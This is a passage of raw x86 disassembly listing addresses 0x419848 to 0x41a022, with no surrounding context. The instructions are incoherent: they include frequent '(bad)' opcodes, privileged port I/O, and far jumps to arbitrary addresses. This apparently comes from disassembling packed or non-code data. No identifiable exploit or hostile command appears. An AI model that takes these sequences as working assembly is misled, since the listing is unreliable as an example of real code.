  419848:	or     DWORD PTR [ebx-0x2],esp
  41984b:	sar    BYTE PTR [ebx],0xb6
  41984e:	imul   ebp,ecx,0xffffffe1
  419851:	push   eax
  419852:	es cmc 
  419854:	shr    DWORD PTR [eax-0x4169ec44],1
  41985a:	jle    0x41984f
  41985c:	adc    al,0x1a
  41985e:	(bad)  
  41985f:	xor    al,ch
  419861:	sar    DWORD PTR [ecx],0xfe
  419864:	mov    bh,0xd7
  419866:	jo     0x419817
  419868:	fwait
  419869:	dec    ecx
  41986a:	pop    ss
  41986b:	dec    edi
  41986c:	cwde   
  41986d:	outs   dx,BYTE PTR ds:[esi]
  41986e:	arpl   WORD PTR [edx-0x4bd5e082],di
  419874:	xchg   ecx,eax
  419875:	stos   DWORD PTR es:[edi],eax
  419876:	(bad)  
  419878:	adc    DWORD PTR [edx+edi*4+0x2b],eax
  41987c:	iret   
  41987d:	ficomp WORD PTR ds:0x406a5231
  419883:	mov    bh,0xd3
  419885:	sub    dl,BYTE PTR ds:0x5644b66c
  41988b:	gs push es
  41988d:	mov    eax,0xdd761635
  419892:	rcl    DWORD PTR [edx-0x44],cl
  419895:	ds (bad) 
  419897:	jmp    0x7bf03e38
  41989c:	xor    al,BYTE PTR [eax+edx*2-0x276ac173]
  4198a3:	inc    ebx
  4198a4:	mov    bh,0x78
  4198a6:	jmp    0x1de6a71f
  4198ab:	ins    DWORD PTR es:[edi],dx
  4198ac:	sbb    ebx,DWORD PTR [ebx+0x262cfcef]
  4198b2:	push   0x5c33d814
  4198b7:	ins    BYTE PTR es:[edi],dx
  4198b8:	xchg   ebx,eax
  4198b9:	or     BYTE PTR [edi-0x50],al
  4198bc:	cli    
  4198bd:	jmp    0x92552432
  4198c2:	lds    ebp,FWORD PTR [ecx-0x34]
  4198c5:	std    
  4198c6:	dec    BYTE PTR [ecx+0x4]
  4198c9:	retf   
  4198ca:	aas    
  4198cb:	outs   dx,BYTE PTR ds:[esi]
  4198cc:	lock jmp 0x82b5:0x46cd5a99
  4198d4:	mov    dh,bh
  4198d6:	pop    ebp
  4198d7:	pop    ebx
  4198d8:	cmp    ch,BYTE PTR [esi+0x6da8eab2]
  4198de:	jge    0x4198ef
  4198e0:	mov    al,0xe5
  4198e2:	fwait
  4198e3:	repnz shr DWORD PTR [eax-0x5ed4f6d3],1
  4198ea:	mov    edx,0x3ab239d3
  4198ef:	sbb    al,0x5c
  4198f1:	or     al,dl
  4198f3:	ror    DWORD PTR [esi+0x14],1
  4198f6:	pop    esp
  4198f7:	sub    esi,DWORD PTR [ebx-0xa2ff8ff]
  4198fd:	fwait
  4198fe:	pop    ebx
  4198ff:	sti    
  419900:	scas   eax,DWORD PTR es:[edi]
  419901:	push   ebp
  419902:	cdq    
  419903:	test   DWORD PTR [ebx],ecx
  419905:	add    al,0x6
  419907:	jbe    0x4198d4
  419909:	xor    bl,0x90
  41990c:	enter  0x375d,0xa3
  419910:	cmc    
  419911:	lahf   
  419912:	dec    eax
  419913:	sub    BYTE PTR [eax],ch
  419915:	cmp    al,0x26
  419917:	pop    ecx
  419918:	out    0x3b,al
  41991a:	(bad)  
  41991b:	icebp  
  41991c:	addr16 addr16 mov cl,0x44
  419920:	jbe    0x4198fd
  419922:	mov    ?,WORD PTR [eax]
  419924:	(bad)  
  419925:	sub    bh,ch
  419927:	pop    ecx
  419928:	mov    DWORD PTR [edx+0x5d4c5124],edx
  41992e:	xchg   edi,eax
  41992f:	dec    esi
  419930:	out    dx,al
  419931:	(bad)  
  419932:	mov    eax,0x63dbc623
  419937:	mov    bh,BYTE PTR [eax+esi*2]
  41993a:	inc    ecx
  41993b:	loopne 0x4198d4
  41993d:	out    0x96,al
  41993f:	loope  0x419940
  419941:	dec    ecx
  419942:	loopne 0x4199b7
  419944:	jg     0x419908
  419946:	ret    
  419947:	sbb    esp,0x0
  41994a:	sbb    dl,BYTE PTR [ebp+0xcaa7682]
  419950:	lahf   
  419951:	and    al,BYTE PTR [edx+edx*8]
  419954:	mov    edi,0xe1b1d993
  419959:	les    edi,FWORD PTR [esi+0xf9002fb]
  41995f:	ins    BYTE PTR es:[edi],dx
  419960:	icebp  
  419961:	xchg   edi,esi
  419963:	mov    ah,0x89
  419965:	imul   ebx,DWORD PTR [esp+eiz*4],0xa4b914ac
  41996c:	out    0xa7,eax
  41996e:	nop
  41996f:	xchg   esi,eax
  419970:	in     eax,0x58
  419972:	and    DWORD PTR [ecx-0x2715178e],0xf8e77efe
  41997c:	xor    DWORD PTR es:[eax],0x74
  419980:	jo     0x419906
  419982:	fwait
  419983:	cmp    eax,0x2af78106
  419988:	scas   eax,DWORD PTR es:[edi]
  419989:	xor    DWORD PTR [ecx+0x47],edx
  41998c:	lea    ecx,[edi+0x77]
  41998f:	xchg   esi,eax
  419990:	ss push ecx
  419992:	push   eax
  419993:	push   ebx
  419994:	inc    eax
  419995:	jmp    0x419959
  419997:	lock fdivr QWORD PTR [eax+ebx*1+0x10240849]
  41999f:	call   FWORD PTR [ebx-0x74]
  4199a2:	cmp    BYTE PTR [ebp+0x10201957],dh
  4199a8:	xor    eax,0x78b2b123
  4199ad:	jnp    0x41995f
  4199af:	sub    al,0x1a
  4199b1:	or     ecx,ebx
  4199b3:	sub    al,0x77
  4199b5:	mov    WORD PTR [ebp-0x16],gs
  4199b8:	dec    edx
  4199b9:	mov    BYTE PTR [ebp-0x20],ch
  4199bc:	dec    eax
  4199bd:	mov    cl,0x89
  4199bf:	fnstenv [ebx+0x308d1d68]
  4199c5:	inc    eax
  4199c6:	scas   eax,DWORD PTR es:[edi]
  4199c7:	sbb    eax,0xeb35d493
  4199cc:	je     0x4199ef
  4199ce:	test   DWORD PTR [ecx-0x3],eax
  4199d1:	int    0xe8
  4199d3:	clc    
  4199d4:	mov    ecx,0x78d68467
  4199d9:	test   eax,0x483e1b3b
  4199de:	mov    eax,ds:0x64084b5f
  4199e3:	test   BYTE PTR [ecx+edi*2+0x12],0xd1
  4199e8:	lock std 
  4199ea:	fcmovne st,st(5)
  4199ec:	inc    esp
  4199ed:	xchg   BYTE PTR [ebx+0x1e125664],dl
  4199f3:	xchg   ebp,eax
  4199f4:	xchg   BYTE PTR [eax],dh
  4199f6:	sub    ch,BYTE PTR [esi-0x751fae]
  4199fc:	pop    ecx
  4199fd:	or     DWORD PTR [edi-0x40],esi
  419a00:	pusha  
  419a01:	inc    eax
  419a02:	cld    
  419a03:	repnz fdiv st,st(6)
  419a06:	adc    BYTE PTR [edx],ah
  419a08:	adc    cl,bl
  419a0a:	enter  0x8ed3,0x87
  419a0e:	repz fidiv DWORD PTR [edi]
  419a11:	push   es
  419a12:	jmp    0x419a7d
  419a14:	loopne 0x419a45
  419a16:	jle    0x419a30
  419a18:	pop    eax
  419a19:	enter  0xd830,0xc3
  419a1d:	and    cl,BYTE PTR [edi+0x780516b2]
  419a23:	push   ds
  419a24:	lods   al,BYTE PTR ds:[esi]
  419a25:	std    
  419a26:	aam    0x41
  419a28:	cmp    bh,BYTE PTR [esi]
  419a2a:	or     al,0x10
  419a2c:	push   ds
  419a2d:	xor    al,0x24
  419a2f:	dec    ecx
  419a30:	int    0x5b
  419a32:	add    DWORD PTR [ebx-0x2dc27f3],eax
  419a38:	xchg   BYTE PTR [edi+0x673a133d],bh
  419a3e:	lds    edi,FWORD PTR [edx-0x420be351]
  419a44:	out    0x6d,eax
  419a46:	cmp    eax,0xcd7ce3b3
  419a4b:	and    eax,0xcea68278
  419a50:	jae    0x4199e4
  419a52:	mov    ah,0x7d
  419a54:	mov    al,ds:0xf2624b73
  419a59:	jno    0x419aab
  419a5b:	sub    ebx,ecx
  419a5d:	loopne 0x4199f6
  419a5f:	xor    DWORD PTR [eax+0x211686fe],ecx
  419a65:	call   0xa2ef:0x5a62f821
  419a6c:	ret    0x892e
  419a6f:	stos   DWORD PTR es:[edi],eax
  419a70:	pop    ss
  419a71:	push   edi
  419a72:	jl     0x419a12
  419a74:	or     al,0xa0
  419a76:	or     DWORD PTR [ebp+0x24e3d369],0x9ca6e031
  419a80:	ror    DWORD PTR [ecx+edi*1+0x574089d7],1
  419a87:	div    DWORD PTR [esi+0x51]
  419a8a:	xchg   ebp,eax
  419a8b:	fsub   QWORD PTR [ebp+0x40]
  419a8e:	in     eax,dx
  419a8f:	lods   al,BYTE PTR ds:[esi]
  419a90:	sub    DWORD PTR [esi+0x2a],eax
  419a93:	or     edi,DWORD PTR [ebp+0x76]
  419a96:	jno    0x419a8e
  419a98:	xor    dl,BYTE PTR [ebp+0x60]
  419a9b:	lahf   
  419a9c:	popa   
  419a9d:	lock sub al,0xc3
  419aa0:	xor    BYTE PTR [esi-0x77ed98ee],al
  419aa6:	sub    bl,cl
  419aa8:	and    ch,ah
  419aaa:	(bad)  
  419aac:	inc    ebx
  419aad:	ret    
  419aae:	inc    ecx
  419aaf:	or     eax,0xfce4af4b
  419ab4:	jbe    0x419a52
  419ab6:	push   edi
  419ab7:	xor    BYTE PTR [esi-0x2e],bh
  419aba:	pmulhuw mm6,QWORD PTR [edi]
  419abd:	sbb    bl,BYTE PTR [edi]
  419abf:	inc    edx
  419ac0:	inc    eax
  419ac1:	(bad)  
  419ac2:	jae    0x419a8d
  419ac4:	xor    esp,esi
  419ac6:	fwait
  419ac7:	in     eax,dx
  419ac8:	das    
  419ac9:	push   ss
  419aca:	add    al,0x1a
  419acc:	push   ebx
  419acd:	jo     0x419a92
  419acf:	push   ebp
  419ad0:	jno    0x419af3
  419ad2:	mov    al,0x37
  419ad4:	lea    eax,[esi+0x52]
  419ad7:	call   0x56f7e7c4
  419adc:	xchg   edi,eax
  419add:	mov    al,ds:0x114d1a0e
  419ae2:	(bad)
  419ae5:	aad    0x71
  419ae7:	js     0x419abc
  419ae9:	jno    0x419b62
  419aeb:	test   al,0x31
  419aed:	mov    dl,0x8c
  419aef:	outs   dx,DWORD PTR ds:[esi]
  419af0:	repz pop edx
  419af2:	or     DWORD PTR [ecx],esi
  419af4:	xor    BYTE PTR [ebx+0x1e73707d],bl
  419afa:	popf   
  419afb:	adc    DWORD PTR [ecx],ebp
  419afd:	(bad)  
  419afe:	loop   0x419b02
  419b00:	enter  0x43ef,0xde
  419b04:	sub    eax,0x6535bee7
  419b09:	adc    al,0x68
  419b0b:	dec    esp
  419b0c:	retf   
  419b0d:	stos   BYTE PTR es:[edi],al
  419b0e:	jmp    0x419b3b
  419b10:	jmp    0xef63:0x3bf5fa8a
  419b17:	shl    DWORD PTR [ebp-0x56c996a1],0xca
  419b1e:	jbe    0x419b54
  419b20:	jecxz  0x419b91
  419b22:	or     BYTE PTR [esi+0x57],al
  419b25:	fs push edx
  419b27:	ss pop esp
  419b29:	adc    eax,0x85130cca
  419b2e:	inc    esp
  419b2f:	or     eax,0x7aa74dfb
  419b34:	dec    eax
  419b35:	rcr    bh,1
  419b37:	mov    ss,WORD PTR [ecx]
  419b39:	leave  
  419b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b3b:	pop    eax
  419b3c:	xor    cl,bl
  419b3e:	sbb    esp,DWORD PTR [ecx+0x0]
  419b41:	aas    
  419b42:	add    DWORD PTR [ecx+0x5f],edi
  419b45:	inc    esi
  419b46:	cmp    al,0x29
  419b48:	loop   0x419b08
  419b4a:	das    
  419b4b:	xor    eax,esp
  419b4d:	hlt    
  419b4e:	js     0x419b92
  419b50:	stos   BYTE PTR es:[edi],al
  419b51:	mov    DWORD PTR [ebx+ecx*8+0x70],eax
  419b55:	test   al,0x39
  419b57:	aam    0x2b
  419b59:	not    bl
  419b5b:	push   esp
  419b5c:	les    ecx,FWORD PTR [eax+ebx*2-0x3b]
  419b60:	adc    DWORD PTR [ebx+edi*8+0x35],0x7dfe357b
  419b68:	xchg   esp,eax
  419b69:	js     0x419b96
  419b6b:	mov    cl,0x22
  419b6d:	popa   
  419b6e:	clc    
  419b6f:	ret    0xf78b
  419b72:	in     eax,0xbb
  419b74:	mov    bh,0xd4
  419b76:	sub    al,0x6e
  419b78:	rcr    BYTE PTR [eax+esi*1+0x4f],0x74
  419b7d:	jne    0x419b8e
  419b7f:	addr16 push 0xffffffcd
  419b82:	adc    esi,esp
  419b84:	jae    0x419b18
  419b86:	pop    ebx
  419b87:	add    al,0xc3
  419b89:	ror    DWORD PTR [eax],1
  419b8b:	inc    eax
  419b8c:	xor    al,BYTE PTR [eax+0x34]
  419b8f:	imul   ebp,DWORD PTR [esi],0x8af95825
  419b95:	addr16 pop ebx
  419b97:	leave  
  419b98:	scas   al,BYTE PTR es:[edi]
  419b99:	xor    ah,BYTE PTR [edi-0x15]
  419b9c:	call   0x5363:0x914a161c
  419ba3:	mov    bh,BYTE PTR [ebp-0x6ca78ad4]
  419ba9:	push   edi
  419baa:	xor    al,0xbd
  419bac:	call   0x982e:0x6a48e313
  419bb3:	jns    0x419b46
  419bb5:	xlat   BYTE PTR ds:[ebx]
  419bb6:	mov    dh,0x63
  419bb8:	in     al,dx
  419bb9:	mov    edx,0xb0f30958
  419bbe:	and    BYTE PTR [ebx-0x4],bl
  419bc1:	mov    eax,0x97f8285a
  419bc6:	sbb    al,0x20
  419bc8:	xor    eax,0x477716b0
  419bcd:	les    eax,FWORD PTR [ecx]
  419bcf:	and    bh,BYTE PTR ds:0x6ae0cda8
  419bd5:	sar    DWORD PTR [eax-0x7],cl
  419bd8:	fnsave [edi]
  419bda:	nop
  419bdb:	push   es
  419bdc:	cmc    
  419bdd:	adc    DWORD PTR [eax-0x4d],0xd65ec241
  419be4:	cmp    BYTE PTR [edx+edx*2-0x48],dh
  419be8:	jecxz  0x419c06
  419bea:	fisubr DWORD PTR [ecx-0x51]
  419bed:	push   0x3f
  419bef:	xchg   esp,eax
  419bf0:	lods   al,BYTE PTR ds:[esi]
  419bf1:	mov    ds:0xe9f90674,al
  419bf6:	sub    cl,BYTE PTR [eax]
  419bf8:	pop    ds
  419bf9:	scas   al,BYTE PTR es:[edi]
  419bfa:	jns    0x419c6a
  419bfc:	pop    ss
  419bfd:	mov    dh,0xfb
  419bff:	arpl   WORD PTR [esi],si
  419c01:	(bad)  
  419c02:	sahf   
  419c03:	xchg   esi,eax
  419c04:	jbe    0x419bfd
  419c06:	sbb    esp,ebx
  419c08:	mov    ch,ch
  419c0a:	jae    0x419c00
  419c0c:	aam    0xa4
  419c0e:	ins    DWORD PTR es:[edi],dx
  419c0f:	stos   DWORD PTR es:[edi],eax
  419c10:	jle    0x419bb3
  419c12:	push   ss
  419c13:	lds    edi,FWORD PTR [esi-0x4745eff0]
  419c19:	xchg   DWORD PTR [eax-0x69],esi
  419c1c:	ds out 0x61,al
  419c1f:	dec    ecx
  419c20:	xchg   esp,eax
  419c21:	les    esp,FWORD PTR fs:0xe5dcdd31
  419c28:	sbb    al,0x95
  419c2a:	cli    
  419c2b:	fcomp  DWORD PTR [ebx+0x7]
  419c2e:	jns    0x419c16
  419c30:	jg     0x419c80
  419c32:	sub    BYTE PTR [esi+0x580eba74],dl
  419c38:	jg     0x419cb2
  419c3a:	ds into 
  419c3c:	mov    cl,0xc4
  419c3e:	retf   0x29a4
  419c41:	sar    DWORD PTR fs:[eax+0x1e],0x51
  419c46:	fist   DWORD PTR [edi]
  419c48:	push   cs
  419c49:	out    dx,al
  419c4a:	lods   eax,DWORD PTR ds:[esi]
  419c4b:	arpl   WORD PTR [ecx+esi*2+0x36e5ce11],dx
  419c52:	mov    eax,0xa5e6a1c5
  419c57:	lock add eax,0xd0a18aed
  419c5d:	cmp    ebp,0x5e2c6623
  419c63:	fbld   TBYTE PTR [ecx-0x16947574]
  419c69:	sbb    eax,0xe46eb6bf
  419c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c6f:	das    
  419c70:	mov    edx,0x53594c87
  419c75:	retf   0x2b48
  419c78:	jb     0x419cf3
  419c7a:	jb     0x419c11
  419c7c:	pop    ebp
  419c7d:	(bad)
  419c82:	xor    ebx,0x11cb1b8e
  419c88:	(bad)  
  419c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c8a:	mov    al,0xf9
  419c8c:	push   edi
  419c8d:	mov    ?,WORD PTR [edi+0x6b1d2a58]
  419c93:	mul    BYTE PTR [esi]
  419c95:	jle    0x419c59
  419c97:	push   es
  419c98:	adc    BYTE PTR [ecx-0x16dcb393],bh
  419c9e:	(bad)  
  419ca0:	jl     0x419c7d
  419ca2:	fdivr  QWORD PTR [ecx+0x29bd232e]
  419ca8:	xchg   ecx,eax
  419caa:	inc    edi
  419cab:	sub    DWORD PTR fs:[edx],ebp
  419cae:	fs aaa 
  419cb0:	pop    eax
  419cb1:	hlt    
  419cb2:	push   0x4c3b410d
  419cb7:	rcl    BYTE PTR [edx+edi*4+0x7222549d],1
  419cbe:	jecxz  0x419cb3
  419cc0:	inc    edx
  419cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc2:	fnsave [edx-0x41]
  419cc5:	std    
  419cc6:	and    esp,DWORD PTR [ebx+0x37]
  419cc9:	(bad)  
  419cca:	xchg   esp,eax
  419ccb:	ds mov dl,0xd9
  419cce:	add    al,0x25
  419cd0:	xor    DWORD PTR [eax+edi*4],ebx
  419cd3:	jp     0x419d24
  419cd5:	mov    edx,0xe77061d9
  419cda:	dec    esp
  419cdb:	inc    esi
  419cdc:	or     eax,0x65c4e121
  419ce1:	jecxz  0x419d30
  419ce3:	push   es
  419ce4:	es ins DWORD PTR es:[edi],dx
  419ce6:	(bad)  
  419ce7:	mov    edx,0x2f3bf220
  419cec:	push   es
  419ced:	mov    dh,0x4a
  419cef:	je     0x419c8b
  419cf1:	jecxz  0x419d0e
  419cf3:	cdq    
  419cf4:	mov    esp,0x9cc4e867
  419cf9:	xchg   ebp,eax
  419cfa:	adc    eax,0x60f16b92
  419cff:	pop    esi
  419d00:	sar    DWORD PTR [ecx],1
  419d02:	adc    ebp,ecx
  419d04:	add    al,0x6
  419d06:	adc    BYTE PTR [esi+0x7e],0xee
  419d0a:	push   0xf
  419d0c:	mov    al,fs:0x65d9312a
  419d12:	sahf   
  419d13:	enter  0x446a,0x9a
  419d17:	cmp    ch,cl
  419d19:	nop
  419d1a:	or     al,BYTE PTR [eax-0x14a66921]
  419d20:	jmp    0x6f0ead6d
  419d25:	add    eax,0x905dbd26
  419d2a:	sar    BYTE PTR [esi],cl
  419d2c:	jp     0x419d5c
  419d2e:	ins    BYTE PTR es:[edi],dx
  419d2f:	js     0x419d32
  419d31:	in     eax,0x9d
  419d33:	add    al,0x71
  419d35:	fsub   st,st(2)
  419d37:	sbb    al,0xe9
  419d39:	and    al,0xd2
  419d3b:	inc    edx
  419d3c:	xor    al,0x2
  419d3e:	scas   al,BYTE PTR es:[edi]
  419d3f:	cmp    BYTE PTR [edi-0x1e],dl
  419d42:	add    bl,BYTE PTR [ebp-0x27060bd2]
  419d48:	mov    ch,0xbd
  419d4a:	je     0x419d5c
  419d4c:	lods   al,BYTE PTR ds:[esi]
  419d4d:	fcomip st,st(4)
  419d4f:	out    0xa5,eax
  419d51:	into   
  419d52:	in     al,0xd0
  419d54:	fisttp QWORD PTR [edi+ecx*2-0x125a60e5]
  419d5b:	es xor eax,0x7de755fa
  419d61:	inc    ecx
  419d62:	sti    
  419d63:	inc    edi
  419d64:	test   eax,0xc56de36e
  419d69:	ss push edi
  419d6b:	sar    ebp,cl
  419d6d:	call   0x5c4757fa
  419d72:	faddp  st(5),st
  419d74:	lods   al,BYTE PTR ds:[esi]
  419d75:	scas   eax,DWORD PTR es:[edi]
  419d76:	mov    edx,0x7672d33b
  419d7b:	xlat   BYTE PTR ds:[ebx]
  419d7c:	cs out dx,al
  419d7e:	(bad)  
  419d7f:	rcr    DWORD PTR [esi+ebx*4],1
  419d82:	test   al,0xc3
  419d84:	jae    0x419da0
  419d86:	clc    
  419d87:	push   ss
  419d88:	inc    edi
  419d89:	repz push ebx
  419d8b:	outs   dx,DWORD PTR ds:[esi]
  419d8c:	ret    0x319d
  419d8f:	sbb    esi,DWORD PTR ds:0x96d5c418
  419d95:	ins    DWORD PTR es:[edi],dx
  419d96:	out    dx,al
  419d97:	mov    bl,0x9e
  419d99:	dec    ebp
  419d9a:	psubusb mm6,QWORD PTR [edi+edi*2+0x18]
  419d9f:	dec    eax
  419da0:	into   
  419da1:	dec    ebp
  419da2:	push   ebx
  419da3:	addr16 dec esp
  419da5:	xor    esi,DWORD PTR [ebp+0x18c0e997]
  419dab:	and    BYTE PTR [ecx+0x16c31a22],0xef
  419db2:	inc    ecx
  419db3:	nop
  419db4:	inc    edx
  419db5:	jge    0x419d7b
  419db7:	js     0x419df8
  419db9:	xchg   edx,eax
  419dba:	fdivr  st,st(3)
  419dbc:	fstp   TBYTE PTR [edi-0x541769c2]
  419dc2:	mov    ebp,0xd41bb972
  419dc7:	and    eax,0x46188eeb
  419dcc:	sbb    bl,BYTE PTR [edi-0x57]
  419dcf:	jge    0x419da6
  419dd1:	push   ebx
  419dd2:	inc    edi
  419dd3:	neg    ah
  419dd5:	loope  0x419e50
  419dd7:	jbe    0x419ded
  419dd9:	push   0x303c3b4b
  419dde:	rol    DWORD PTR [ebx-0x1f1bb455],0xb5
  419de5:	shl    BYTE PTR [edx+0x7c778147],0x58
  419dec:	(bad)  [ecx-0x60]
  419def:	sbb    edi,eax
  419df1:	das    
  419df2:	lock jae 0x419e2b
  419df5:	jo     0x419dd2
  419df7:	push   ecx
  419df8:	xchg   ebx,eax
  419df9:	sub    DWORD PTR [edi-0x5d],0xea9f9236
  419e00:	cmp    DWORD PTR [ecx+0x19],esi
  419e03:	fld    TBYTE PTR ds:0xa0d7136b
  419e09:	ins    BYTE PTR es:[edi],dx
  419e0a:	fisubr WORD PTR [eax-0x6a08e096]
  419e10:	cmc    
  419e11:	out    dx,eax
  419e12:	fstp   QWORD PTR [edx]
  419e14:	add    al,0xc1
  419e16:	mov    ecx,0xe464c68e
  419e1b:	mov    edi,0x8ae538cc
  419e20:	outs   dx,BYTE PTR ds:[esi]
  419e21:	stos   DWORD PTR es:[edi],eax
  419e22:	mov    ebp,0x953264c7
  419e27:	ret    
  419e28:	ins    DWORD PTR es:[edi],dx
  419e29:	imul   esi,DWORD PTR [esi+0x3204f2fa],0xffffffd5
  419e30:	scas   eax,DWORD PTR es:[edi]
  419e31:	pop    esi
  419e32:	aaa    
  419e33:	mov    dh,0x6b
  419e35:	loopne 0x419e2d
  419e37:	fdivr  QWORD PTR ds:0x7b152250
  419e3d:	xor    eax,0x78a4727c
  419e42:	xchg   ebp,eax
  419e43:	out    dx,eax
  419e44:	std    
  419e45:	daa    
  419e46:	push   cs
  419e47:	lods   al,BYTE PTR ds:[esi]
  419e48:	jne    0x419e8f
  419e4a:	xchg   ebp,eax
  419e4b:	sbb    BYTE PTR [eax],dh
  419e4d:	(bad)  
  419e4e:	cmp    al,0x1c
  419e50:	or     DWORD PTR [ecx],edx
  419e52:	dec    edi
  419e53:	fnstenv [edi-0x77]
  419e56:	imul   BYTE PTR [ebx]
  419e58:	cdq    
  419e59:	sub    ah,BYTE PTR [ecx]
  419e5b:	popa   
  419e5c:	das    
  419e5d:	push   eax
  419e5e:	in     eax,0x27
  419e60:	mov    ds:0xf6e80fc4,eax
  419e65:	jmp    0x94a71ac9
  419e6a:	retf   0x7d80
  419e6d:	and    eax,DWORD PTR [ebx]
  419e6f:	xchg   edi,eax
  419e70:	(bad)  
  419e71:	in     al,0xa1
  419e73:	mov    al,0xc3
  419e75:	pushf  
  419e76:	mov    al,0x77
  419e78:	shl    ecx,1
  419e7a:	cli    
  419e7b:	add    al,0xfe
  419e7d:	test   al,0x70
  419e7f:	aas    
  419e80:	int3   
  419e81:	mov    edi,0x9d9d83e0
  419e86:	fwait
  419e87:	les    edx,FWORD PTR [edi-0x5ff13f36]
  419e8d:	cli    
  419e8e:	in     eax,0x1f
  419e90:	das    
  419e91:	jecxz  0x419e2c
  419e93:	js     0x419e19
  419e95:	jmp    0x419e60
  419e97:	loop   0x419eb5
  419e99:	aas    
  419e9a:	test   DWORD PTR [ebx],edx
  419e9c:	sbb    eax,0x805f8325
  419ea1:	ficom  WORD PTR [esi]
  419ea3:	inc    esp
  419ea4:	(bad)  
  419ea5:	push   ebx
  419ea6:	scas   al,BYTE PTR es:[edi]
  419ea7:	jmp    0x8bae9c4c
  419eac:	les    ebp,FWORD PTR ds:0x83e38b5e
  419eb2:	(bad)  
  419eb3:	in     eax,dx
  419eb4:	sub    eax,0x853e1e5
  419eb9:	jne    0x419e84
  419ebb:	loopne 0x419e8a
  419ebd:	dec    ecx
  419ebe:	shl    DWORD PTR [ebx+esi*1+0x17],1
  419ec2:	icebp  
  419ec3:	mov    esp,0xe45381d3
  419ec8:	sahf   
  419ec9:	imul   eax,DWORD PTR [eax],0x17
  419ecc:	shl    cl,0x28
  419ecf:	jmp    0xb805:0x24dbc803
  419ed6:	fsub   QWORD PTR [edi-0x48]
  419ed9:	xor    ebp,DWORD PTR [esp+eax*8+0x1fd62f85]
  419ee0:	pop    ebp
  419ee1:	xchg   ecx,eax
  419ee2:	stos   DWORD PTR es:[edi],eax
  419ee3:	iret   
  419ee4:	push   ds
  419ee5:	pop    edi
  419ee6:	jmp    0x4df1221e
  419eeb:	(bad)  
  419eed:	int    0x0
  419eef:	mov    esp,0xa0748fcf
  419ef4:	es inc ecx
  419ef6:	adc    al,0xe8
  419ef8:	(bad)  
  419ef9:	mov    ebp,0x596984bb
  419efe:	cmp    eax,0x1cfd9c88
  419f03:	enter  0xfe21,0x78
  419f07:	push   esi
  419f08:	mov    edi,0xd8bd1db4
  419f0d:	mov    bl,0xac
  419f0f:	xor    eax,0xd14240d0
  419f14:	or     edi,DWORD PTR [ecx]
  419f16:	xchg   ebp,eax
  419f17:	xor    BYTE PTR [edx-0x3e85f79f],al
  419f1d:	test   DWORD PTR [eax+0x79],edi
  419f20:	and    ebx,DWORD PTR [eax]
  419f22:	mov    DWORD PTR [edx],0x9557805b
  419f28:	xchg   ebp,eax
  419f29:	push   0xc8b1fde0
  419f2e:	lea    ecx,[ecx+ebp*4+0x19]
  419f32:	(bad)  
  419f33:	jge    0x419eee
  419f35:	imul   ebx,edx,0x9112844a
  419f3b:	lods   al,BYTE PTR ds:[esi]
  419f3c:	mov    eax,0xe8340864
  419f41:	test   DWORD PTR ss:[ebx-0x2c736340],edx
  419f48:	cs jge 0x419eed
  419f4b:	(bad)  
  419f4d:	ret    
  419f4e:	pop    es
  419f4f:	xchg   ebp,eax
  419f50:	(bad)  
  419f51:	jb     0x419f4e
  419f53:	out    0xf9,al
  419f55:	and    eax,DWORD PTR [edx+0xc]
  419f58:	jnp    0x419fba
  419f5a:	sbb    eax,DWORD PTR [esi-0x41964c2f]
  419f60:	shl    DWORD PTR [ebx-0x51],0x54
  419f64:	mov    dh,0xa4
  419f66:	fst    QWORD PTR [edx-0x4c80a3b6]
  419f6c:	cmp    al,0x8c
  419f6e:	les    esp,FWORD PTR [esi]
  419f70:	jle    0x419f1c
  419f72:	into   
  419f73:	jmp    DWORD PTR [ebx+0x38da7cc1]
  419f79:	jecxz  0x419f7e
  419f7b:	inc    edx
  419f7c:	cld    
  419f7d:	adc    BYTE PTR [ebp+0x6924efb6],dh
  419f83:	rol    BYTE PTR [ebx],1
  419f85:	test   dh,dl
  419f87:	into   
  419f88:	popa   
  419f89:	cld    
  419f8a:	int    0xa3
  419f8c:	fld    TBYTE PTR [ebx]
  419f8e:	push   cs
  419f8f:	jmp    0x41a002
  419f91:	xchg   esi,eax
  419f92:	inc    edx
  419f93:	ja     0x419f81
  419f95:	outs   dx,BYTE PTR ds:[esi]
  419f96:	dec    eax
  419f97:	addr16 push ebp
  419f99:	enter  0x4c29,0x69
  419f9d:	mov    esp,0xb15942b0
  419fa2:	push   0x7afc4dc
  419fa7:	sub    DWORD PTR [ecx-0xf],0x8ce22542
  419fae:	outs   dx,BYTE PTR ds:[esi]
  419faf:	les    ecx,FWORD PTR [eax]
  419fb1:	ss pop ds
  419fb3:	xor    BYTE PTR [esi+edi*8-0x6a],0xed
  419fb8:	xor    eax,0xe9b9dd39
  419fbd:	mov    ds:0xf836555d,al
  419fc2:	adc    BYTE PTR [esi-0x3bda3fa6],0xd9
  419fc9:	bound  edx,QWORD PTR [edi+0x7cae0187]
  419fcf:	pop    esi
  419fd0:	xchg   esi,eax
  419fd1:	push   0xffffffa8
  419fd3:	jb     0x419fda
  419fd5:	(bad)  
  419fd6:	pop    esp
  419fd7:	xor    BYTE PTR [ebx+eiz*2-0x3f],al
  419fdb:	dec    eax
  419fdc:	jmp    0x41a029
  419fde:	mov    ecx,0xb9e13f71
  419fe3:	cld    
  419fe4:	jne    0x419f94
  419fe6:	jge    0x419fad
  419fe8:	fwait
  419fe9:	push   ebp
  419fea:	xchg   edx,eax
  419feb:	loop   0x41a054
  419fed:	xor    DWORD PTR [ebp+0x5178b433],ebp
  419ff3:	jle    0x419fbf
  419ff5:	pop    edi
  419ff6:	out    0x2e,al
  419ff8:	xchg   esi,eax
  419ff9:	cli    
  419ffa:	mov    edi,0x49007089
  419fff:	daa    
  41a000:	inc    esp
  41a001:	xchg   edi,eax
  41a002:	ror    DWORD PTR [esi-0x5d18f596],0x29
  41a009:	lods   eax,DWORD PTR ds:[esi]
  41a00a:	or     cl,BYTE PTR [ecx+0x18]
  41a00d:	cmp    BYTE PTR [ebp-0x59],ch
  41a010:	enter  0x83c8,0x92
  41a014:	test   bh,cl
  41a016:	imul   eax,DWORD PTR [edi],0x18
  41a019:	aam    0xdb
  41a01b:	sbb    eax,esp
  41a01d:	cmp    al,0x47
  41a01f:	stos   DWORD PTR es:[edi],eax
  41a020:	mov    dh,0xf
  41a022:	pop    eax
